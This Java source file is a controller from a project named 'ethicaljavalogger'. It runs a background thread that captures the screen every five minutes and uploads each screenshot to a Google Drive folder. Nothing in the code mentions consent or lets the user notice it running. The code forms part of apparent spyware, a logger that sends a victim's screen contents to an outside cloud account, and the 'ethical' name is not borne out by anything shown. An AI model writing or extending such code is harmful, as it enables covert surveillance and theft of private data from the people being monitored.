package com.mycompany.ethicaljavalogger.controllers;

import com.mycompany.ethicaljavalogger.constants.FileType;
import com.mycompany.ethicaljavalogger.services.GoogleDriveService;
import com.mycompany.ethicaljavalogger.services.ScreenCaptureService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ScreenCaptureController {
    
    public void handleScreenCapture() {
        ScreenCaptureService screenCaptureService = new ScreenCaptureService();
        
        new Thread(() -> {
            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

            scheduler.scheduleAtFixedRate(() -> {
                String imagePath = screenCaptureService.capture();
                String fileName = screenCaptureService.generateFileName();
                
                GoogleDriveService.getInstance().sendMedia(fileName, imagePath, GoogleDriveService.getInstance().getImagesFolderId(), FileType.IMAGE_PNG);
            }, 0, 5, TimeUnit.MINUTES);
        }).start();
    }
}
